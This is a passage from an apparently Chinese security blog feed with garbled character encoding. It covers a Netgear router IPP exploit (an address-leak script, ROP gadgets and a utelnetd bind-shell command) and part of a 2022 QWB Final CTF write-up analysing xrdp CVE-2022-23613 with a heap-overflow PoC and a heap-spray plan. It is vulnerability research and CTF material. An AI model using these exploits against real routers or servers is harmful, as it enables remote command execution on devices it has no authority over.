class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># recv_buf[2] || recv_buf[3] == 10</span></span><br><span class="line">    recv_buf1  = <span class="string">b&#x27;\x00\x00\x00\x0a\x00\x00\x99\x99&#x27;</span></span><br><span class="line">    recv_buf2  = <span class="string">b&#x27;\x00\x44\x00\x00\x10\x5d&#x27;</span> <span class="comment"># 0x1050 is copy_len -&gt; memcpy(command, &amp;recv_buf[offset], copy_len);</span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;job-id\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">    junkdata = cyclic(<span class="number">0x104c</span> , n=<span class="number">4</span>)</span><br><span class="line">    junkdata = bytearray(junkdata)</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br><span class="line">    junkdata[<span class="number">0x103c</span>: <span class="number">0x103c</span> + <span class="number">4</span>] = p32(<span class="number">0x106a</span><span class="number">-0xe</span>) <span class="comment"># finish flag offset</span></span><br><span class="line">    junkdata[<span class="number">0x1048</span>: <span class="number">0x1048</span> + <span class="number">4</span>] = p32(<span class="number">0x20</span>)     <span class="comment"># malloc size  - &gt; final_ptr = malloc(++final_size);</span></span><br><span class="line">    junkdata = bytes(junkdata)</span><br><span class="line"></span><br><span class="line">    recv_buf2 += junkdata</span><br><span class="line">    recv_buf2 += p32(<span class="number">20</span>)       <span class="comment"># overwrite  prrefix_size</span></span><br><span class="line">    recv_buf2 += p32(<span class="number">0x180E4</span>)  <span class="comment"># overwrite  prefix_ptr -&gt; .got start address then free is alive </span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b&#x27;POST /USB1_LQ\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: %b\r\n&#x27;</span> % str(len(recv_buf1 + recv_buf2)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">631</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.send(recv_buf1)</span><br><span class="line">    p.send(recv_buf2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    _dl_linux_resolve = u32(p.recvn(<span class="number">4</span>)) </span><br><span class="line">    print(<span class="string">&#x27;_dl_linux_resolve : &#123;:#x&#125;&#x27;</span>.format(_dl_linux_resolve))</span><br><span class="line">    ld_uClibc =  _dl_linux_resolve - <span class="number">0x3e70</span></span><br><span class="line">    print(<span class="string">&#x27;ld_uClibc : &#123;:#x&#125;&#x27;</span>.format(ld_uClibc))</span><br><span class="line">    p.recvn(<span class="number">4</span>)</span><br><span class="line">    printf_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    print(<span class="string">&#x27;printf : &#123;:#x&#125;&#x27;</span>.format(printf_addr))</span><br><span class="line">    uClibc = printf_addr - <span class="number">0x360e0</span></span><br><span class="line">    print(<span class="string">&#x27;uClibc : &#123;:#x&#125;&#x27;</span>.format(uClibc))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system = uClibc + +0x90f4 # system offset </span></span><br><span class="line">    <span class="comment"># print(&#x27;system : &#123;:#x&#125;&#x27;.format(system))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ld_uClibc, uClibc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Leak:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp_ncc_netgear_ipp.py</span><br><span class="line">[+] Opening connection to 192.168.1.1 on port 631: Done</span><br><span class="line">_dl_linux_resolve : 0x40021e70</span><br><span class="line">ld_uClibc : 0x4001e000</span><br><span class="line"><span class="built_in">printf</span> : 0x401700e0</span><br><span class="line">uClibc : 0x4013a000</span><br></pre></td></tr></table></figure><h3 id="Arbitrary-command-execution"><a href="#Arbitrary-command-execution" class="headerlink" title="Arbitrary command execution"></a>Arbitrary command execution</h3><p>é€šè¿‡æ³„æ¼ uclibc çš„åœ°å€ï¼Œ ç„¶åå¯ä»¥è®¡ç®— <code>system</code>  çš„åœ°å€ã€‚ ç„¶åæˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥åšåŠ«æŒè¿”å›åœ°å€å·¥ä½œã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æœ‰ä¸ªä¸€ä¸ªåœ°å€æ¥å­˜å‚¨æˆ‘ä»¬ <code>system</code> å°†æ‰§è¡Œçš„å­—ç¬¦ä¸²ã€‚ å›é¡¾ä¸Šæ–‡ï¼Œ æˆ‘ä»¬æåŠåˆ°äº†ç³»ç»Ÿçš„éšæœºåŒ–ç­‰çº§ä¸º <code>1</code> ã€‚</p><p>ç³»ç»ŸéšæœºåŒ–å¼€å¯æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å †ä¸ŠæŸ¥æ‰¾æ˜¯å¦æœ‰å¯æ§çš„å†…å®¹ï¼Œ é€šè¿‡ <code>hexdump</code> æŸ¥æ‰¾ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png"></a></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„ payload ä¼šå­˜å‚¨åœ¨ å †ä¸Šï¼Œ å› æ­¤ ï¼Œ æˆ‘ä»¬å¯ä»¥å°†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œ åœ¨ç¬¬ä¸€æ¬¡é“¾æ¥çš„æ—¶å€™ ï¼Œ å°±å°†å‘½ä»¤å†™å…¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/touch /tmp/hacked&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line">...</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br></pre></td></tr></table></figure><p>åœ¨è¦†ç›–è¿”å›åœ°å€ä¹‹å‰ ï¼Œ é™¤äº†åœ¨ leak éœ€è¦æ³¨æ„çš„é‚£å‡ ä¸ªå˜é‡ä»¥å¤– ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å•ç‹¬æ³¨æ„</p><ul><li>flag1</li><li>v17</li><li>response_len</li></ul><p>ç­‰å˜é‡çš„å€¼ï¼Œ è¦å•ç‹¬é‡æ–°èµ‹å€¼ã€‚</p><p>æœ€åæˆ‘ä»¬éœ€è¦å°† <code>R0</code> çš„å€¼æŒ‡å‘å †ä¸Šçš„ <code>0x1b880</code> åœ°å€ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦å•ç‹¬å‡ ä¸ª <code>gadget</code> ï¼Œ è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ª <code>gadget</code> ã€‚</p><p>é¦–å…ˆé€šè¿‡ç¬¬ä¸€ä¸ª  <code>gadget</code>  æ§åˆ¶ <code>R3</code>  ä¸º 0x1b880</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00001504 : pop &#123;r3, r4, fp, pc&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ ç¬¬äºŒä¸ª <code>gadget</code>  å°† <code>R3</code> çš„å€¼èµ‹å€¼ç»™ <code>R0</code> å¹¶ä¸”æ§åˆ¶ PC è·³è½¬åˆ° <code>system</code> å‡½æ•°ä¸Šï¼Œä»è€Œå®Œæˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000a80 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±å¯ä»¥å®Œæˆä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png"></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://research.nccgroup.com/2022/08/30/ncc-con-europe-2022-pwn2own-austin-presentations/">NCC Con Europe 2022 â€“ Pwn2Own Austin Presentations</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> netgear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 QWB Final RealWorld Challenge Writeup</title>
      <link href="2022-QWB-Final-RealWorld-Challenge-Writeup.html"/>
      <url>2022-QWB-Final-RealWorld-Challenge-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¹´ä¸0x300Rçš„å°ä¼™ä¼´å‚ä¸äº† 2022 QWB Final  ï¼Œ åœ¨è¿™æ¬¡æ¯”èµ›ä¸­æˆ‘å’Œå°ä¼™ä¼´ä»¬ è§£å†³äº†ä¸å°‘ RW é¢˜ç›®ï¼Œ è€Œæˆ‘æœ¬äººå‚ä¸çš„ä¸€å…±æœ‰ä¸‰é“è·¯ç”±å™¨é¢˜ã€ä¸€é“ RDP ææƒ ã€ ä¸€é“ VPN  é¢˜ç›®ã€‚åœ¨æ­¤æˆ‘ç®€å•è®°è¿°ä¸‹å…¶ä¸­çš„è·¯ç”±å™¨é¢˜ä»¥åŠ RDP é¢˜ç›®ï¼Œ è€Œ VPN é¢˜ç›®æ¶‰åŠä¸€äº›åˆ«çš„äº‹æƒ…ï¼Œå°±ä¸æ–¹ä¾¿å…¬å¼€ã€‚</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬æ”»å‡» XRDP ç„¶åè¿›è¡Œæœ¬åœ°ææƒçš„æ•ˆæœ ï¼Œ è·å–ubuntuæ“ä½œç³»ç»Ÿrootæƒé™ï¼Œ å¹¶åœ¨/ç›®å½•æˆåŠŸå†™å…¥å†…å®¹åŒ…å«é˜Ÿä¼ç‰¹å¾çš„flagæ–‡ä»¶ã€‚</p><p>ç¨‹åºç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@RDP:/home/rdp/Desktop<span class="comment"># xrdp-sesman -version</span></span><br><span class="line">xrdp-sesman 0.9.18</span><br><span class="line">  The xrdp session manager</span><br><span class="line">  Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.</span><br><span class="line">  See https://github.com/neutrinolabs/xrdp <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">  Configure options:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¥ç‰ˆæœ¬å—åˆ° <code>CVE-2022-23613</code> å½±å“</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¡¥ä¸ä»£ç ï¼š <a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="addition">+ #define HEADER_SIZE 8</span></span><br><span class="line">    int version;</span><br><span class="line">    int size;</span><br><span class="line"></span><br><span class="line">    if (self-&gt;extra_flags == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line"><span class="deletion">-        if (size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line"><span class="addition">+        if (size &lt; HEADER_SIZE || size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="deletion">-            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size&quot;);</span></span><br><span class="line"><span class="addition">+            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size %d&quot;, size);</span></span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">@@ -302,11 +303,12 @@ sesman_data_in(struct trans *self)</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        /* reset for next message */</span><br><span class="line"><span class="deletion">-        self-&gt;header_size = 8;</span></span><br><span class="line"><span class="addition">+        self-&gt;header_size = HEADER_SIZE;</span></span><br><span class="line">        self-&gt;extra_flags = 0;</span><br><span class="line">        init_stream(self-&gt;in_s, 0); /* Reset input stream pointers */</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"><span class="addition">+ #undef HEADER_SIZE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************************************************************/</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ†æè¡¥ä¸ï¼Œæˆ‘ä»¬çŸ¥é“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/sesman/sesman.c#L282</span></span><br><span class="line"></span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self-&gt;extra_flags == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line">        <span class="keyword">if</span> (size &gt; self-&gt;in_s-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            LOG(LOG_LEVEL_ERROR, <span class="string">&quot;sesman_data_in: bad message size&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">        self-&gt;extra_flags = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¢«åŠ äº†æ£€æŸ¥çš„ <code>size</code> ä¼šè¢«èµ‹å€¼åˆ° <code>self-&gt;header_size</code> ä¸­ï¼Œ å¦‚æœæˆ‘ä»¬å°† <code>size</code> å³ <code>self-&gt;header_size</code>  è®¾ç½®æˆä¸€ä¸ª<code>0x80000000</code>ï¼Œ </p><p>é‚£ä¹ˆå¯èƒ½åœ¨ æº¢å‡ºç‚¹ï¼š <a href="https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383">https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line">            &#125;</span><br><span class="line">            read_so_far = (<span class="keyword">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);</span><br><span class="line">            to_read = self-&gt;header_size - read_so_far;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (to_read &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read); <span class="comment">// trans_tcp_recv</span></span><br></pre></td></tr></table></figure><p>é€ æˆç¼“å†²åŒºæº¢å‡ºï¼š</p><p>å› æ­¤æˆ‘ä»¬å°è¯•æ„é€ å¦‚ä¸‹ PoCï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">3350</span>))</span><br><span class="line">    sdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">0x2222CCCC</span>) <span class="comment">#version</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="number">0x80000000</span>) <span class="comment">#headersize</span></span><br><span class="line">    s.send(sdata)</span><br><span class="line">    print(sdata)</span><br><span class="line">    sdata = <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x10000</span>  </span><br><span class="line">    s.send(sdata)</span><br></pre></td></tr></table></figure><p>å¹¶åœ¨å¯¹åº”çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œ åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png"></a></p><p><code>r8d</code> ä¸º <code>self-&gt;header_size</code> 0x80000000<code>ï¼Œ</code>read_so_far<code>ä¸º</code>0x9` ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png"></a></p><p>ç›¸å‡å®Œåæ˜¯ä¸ªè´Ÿæ•°ï¼Œåœ¨æ‹·è´çš„æ—¶å€™ä¼šå‘ç”Ÿ <code>heap overflow</code></p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>å‡ºé¢˜äººä¿®æ”¹äº† <code>MAX_SHORT_LIVED_CONNECTIONS</code></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/sesman/sesman.c b/sesman/sesman.c</span><br><span class="line">index a8576905..38a2f642 100644</span><br><span class="line"><span class="comment">--- a/sesman/sesman.c</span></span><br><span class="line"><span class="comment">+++ b/sesman/sesman.c</span></span><br><span class="line"><span class="meta">@@ -40,7 +40,7 @@</span></span><br><span class="line">  * At the moment, all connections to sesman are short-lived. This may change</span><br><span class="line">  * in the future</span><br><span class="line">  */</span><br><span class="line"><span class="deletion">-#define MAX_SHORT_LIVED_CONNECTIONS 16</span></span><br><span class="line"><span class="addition">+#define MAX_SHORT_LIVED_CONNECTIONS 512</span></span><br><span class="line"></span><br><span class="line"> struct sesman_startup_params</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å †å–·ï¼Œè¦†ç›–ç»“æ„ä½“æŒ‡é’ˆæ¥è¾¾åˆ°æ§åˆ¶ PC çš„ç›®çš„ï¼Œ é€šè¿‡ä»£ç é˜…è¯»ï¼Œæˆ‘ä»¬å‘ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *</span></span><br><span class="line"><span class="class"><span class="title">trans_create</span>(<span class="title">int</span> <span class="title">mode</span>, <span class="title">int</span> <span class="title">in_size</span>, <span class="title">int</span> <span class="title">out_size</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *<span class="title">self</span> = (<span class="title">struct</span> <span class="title">trans</span> *) <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    self = (struct trans *) g_malloc(<span class="keyword">sizeof</span>(struct trans), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        make_stream(self-&gt;in_s);</span><br><span class="line">        init_stream(self-&gt;in_s, in_size);</span><br><span class="line">        make_stream(self-&gt;out_s);</span><br><span class="line">        init_stream(self-&gt;out_s, out_size);</span><br><span class="line">        self-&gt;mode = mode;</span><br><span class="line">        self-&gt;tls = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* assign tcp calls by default */</span></span><br><span class="line">        self-&gt;trans_recv = trans_tcp_recv;</span><br><span class="line">        self-&gt;trans_send = trans_tcp_send;</span><br><span class="line">        self-&gt;trans_can_recv = trans_tcp_can_recv;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>trans_create</code> å‡½æ•°æ¥åšå †å–·ã€‚ä¸”åˆ†é…å‡ºæ¥çš„ <code>trans *self</code>  å¯¹è±¡æ‹¥æœ‰å‡½æ•°æŒ‡é’ˆï¼Œæˆ‘ä»¬åªéœ€è¦†ç›– <code>self-&gt;trans_recv</code> å°±èƒ½æ§åˆ¶ PCã€‚å¦å¤–ç¨‹åºæ²¡æœ‰å¼€å¯ PIEï¼Œ ä¸”ç¨‹åºæœ¬èº«æœ‰ <code>g_execlp3</code> ä¹‹ç±»çš„æ‰§è¡Œä»£ç çš„å‡½ï¼Œé¢˜ç›®åˆåªè¦æ±‚æœ¬åœ°ææƒå³å¯ï¼Œæ‰€ä»¥åˆ©ç”¨æ€è·¯æ¯”è¾ƒæ¸…æ™°ã€‚</p><ol><li>åˆ›å»ºå¤šä¸ªé“¾æ¥ï¼Œè¿›è¡Œå †å–·</li><li>æº¢å‡ºè¦†ç›– <code>self-&gt;trans_recv</code> ä¸º <code>g_execlp3</code> ï¼Œ ä¸”æ§åˆ¶ <code>RDI</code> ä¸ºæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ (è¦ç»å¯¹è·¯å¾„)</li><li>è°ƒç”¨ <code>self-&gt;trans_recv</code> æ‰§è¡Œä»»æ„å‘½ä»¤</li></ol><h2 id="totox-3"><a href="#totox-3" class="headerlink" title="totox/3"></a>totox/3</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>ç”Ÿæ­»ç«é€Ÿï¼Œæœ¬é¢˜åˆ†ä¸ºä¸‰é¢˜ï¼Œéœ€è¦é€‰æ‰‹ä»ä¸‰ä¸ªä¸åŒè·¯å¾„ï¼ˆä¸åŒè·¯å¾„æŒ‡ä»ä¸‰ä¸ªä¸åŒå®é™…äº§ç”Ÿå‘½ä»¤æ³¨å…¥ã€ç ´åå †æ ˆç»“æ„ç­‰å†…å®¹ï¼‰å®ç°å¯¹TOTOLINKçš„æ”»å‡»ã€‚</p><p>è¿™å…¶å®æ˜¯ä¸€ä¸ªè·¯ç”±å™¨é¢˜ç›®ï¼Œ ä¸»åŠæ–¹è¦æ±‚æˆ‘ä»¬é€šè¿‡ä¸‰ä¸ªä¸åŒçš„è·¯å¾„æ”»ç ´è¯¥è·¯ç”±å™¨ï¼Œ å³éœ€è¦ä½¿ç”¨åˆ°ä¸‰ä¸ªä¸åŒçš„æ¼æ´ã€‚ å›ºä»¶ç‰ˆæœ¬ä¸ºï¼š X5000R_å›ºä»¶_V9.1.0u.6118_B20201102</p><p>é€šè¿‡ç½‘ä¸ŠæŸ¥é˜…èµ„æ–™ï¼Œ æˆ‘ä»¬å‘ç°è¯¥æ¬¾è·¯ç”±å™¨æ‹¥æœ‰è®¸å¤šçš„ CVE ç¼–å·ï¼Œ 